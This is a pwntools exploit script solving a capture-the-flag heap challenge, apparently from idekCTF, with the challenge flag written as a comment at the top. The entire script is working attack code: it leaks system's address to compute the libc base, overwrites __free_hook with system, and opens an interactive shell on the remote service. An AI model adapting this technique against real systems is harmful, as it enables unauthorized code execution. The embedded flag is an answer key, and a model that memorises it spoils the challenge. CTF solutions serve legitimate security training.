# idek{c0ngr4ts_0n_m4yb3_y0ur_1st_h34p_ch4ll!!!_m4y_y0u_s0lv3_m4ny_m0re...}
from pwn import *

target = remote("cached.chal.idek.team", 1337)

target.send("\n"*4)

libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

target.recvuntil("system @ ")
libc.address = int(target.recvline().strip(), 0x10) - libc.sym['system']
log.info("LIBC Base: " + hex(libc.address))

target.sendlineafter("fgets", p64(libc.sym['__free_hook']) + "A"*8)

target.sendlineafter("fgets", p64(libc.sym['system']))

target.interactive()